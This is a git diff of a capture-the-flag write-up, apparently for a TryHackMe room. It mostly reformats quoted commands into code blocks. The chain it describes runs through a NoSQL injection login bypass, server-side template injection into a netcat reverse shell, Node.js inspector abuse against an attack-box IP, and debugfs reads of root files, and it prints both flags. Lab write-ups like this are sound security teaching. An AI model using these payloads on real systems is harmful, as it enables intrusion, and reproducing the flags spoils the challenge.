@@ -59,7 +59,7 @@ Enable Intercept.
 
 Replace the request body with:
 
-> username=attendant&password[$ne]=
+``` username=attendant&password[$ne]= ```
 
 This is a classic NoSQL Injection payload targeting MongoDB..
 
@@ -76,6 +76,7 @@ We now gain access to the Cabana Desk with staff privileges.
 
 Inside the dashboard, there is a Preview textbox.
 > Entering: 7*7
+>
 > returns: 49
 
 The application is evaluating our input on the server instead of treating it as plain text. This indicates a Server-Side Template Injection (SSTI) vulnerability, meaning arbitrary JavaScript expressions can be executed.
@@ -90,7 +91,7 @@ This means we can used it to do some reverse shell payload (just correct me if I
 ```
 
 Start a Netcat listener:
-> nc -lvnp 4444
+``` nc -lvnp 4444 ```
 
 Click Preview.
 
@@ -105,7 +106,7 @@ We now have command execution as the poolside user.
 #### Part 3 — Retrieve the User Flag
 
 Instead of manually searching every directory, use:
-> cat /*/*/user.txt
+``` cat /*/*/user.txt ```
 
 This attempts to print every user.txt located two directory levels below the root directory.
 
@@ -244,7 +245,7 @@ Its workflow is:
 Since the Node.js service runs with higher privileges than the current shell, this gives us access as the pipeline user.
 
 Execute the script:
-> node /tmp/insp.js ATTACK_BOX_IP 4445
+``` node /tmp/insp.js ATTACK_BOX_IP 4445 ```
 
 <img width="1326" height="543" alt="image" src="https://github.com/user-attachments/assets/64ce759b-9b14-419a-82f9-c0b1314736a0" />
 
@@ -255,12 +256,12 @@ We now receive another shell running as pipeline.
 Since the pipeline user has permission to access the filesystem using debugfs, we can inspect the root directory without switching users.
 
 First, list the contents of /root:
-> debugfs -R "ls -l /root" /dev/nvme0n1p1
+``` debugfs -R "ls -l /root" /dev/nvme0n1p1 ```
 
 <img width="656" height="308" alt="image" src="https://github.com/user-attachments/assets/10c364d2-d04e-447d-81cd-86506856ca86" />
 
 After confirming the location of root.txt, read it directly:
-> debugfs -R "cat  /root/root.txt" /dev/nvme0n1p1
+``` debugfs -R "cat  /root/root.txt" /dev/nvme0n1p1 ```
 
 <img width="654" height="117" alt="image" src="https://github.com/user-attachments/assets/3e0d3b99-88bd-4f14-8fe4-5868ffdbbdd4" />
 
@@ -280,6 +281,7 @@ After confirming the location of root.txt, read it directly:
 ### Flag
 
 User Flag: THM{w4rm_s3ss10n_h1j4ck3d}
+
 Root Flag: THM{r4w_d1sk_4cc3ss_w4s_t00_much}
 
 This challenge demonstrated how multiple vulnerabilities can be chained together to achieve full system compromise. The attack began with a NoSQL Injection that bypassed authentication, followed by a Server-Side Template Injection (SSTI) that provided remote code execution. From the initial shell, an exposed Node.js Inspector service was abused to execute JavaScript within a higher-privileged process, resulting in privilege escalation. Finally, the pipeline user's access to debugfs allowed direct reading of the root filesystem, leading to the recovery of the root flag. Overall, the challenge highlights how seemingly unrelated misconfigurations can combine into a complete attack path from initial access to full system compromise.
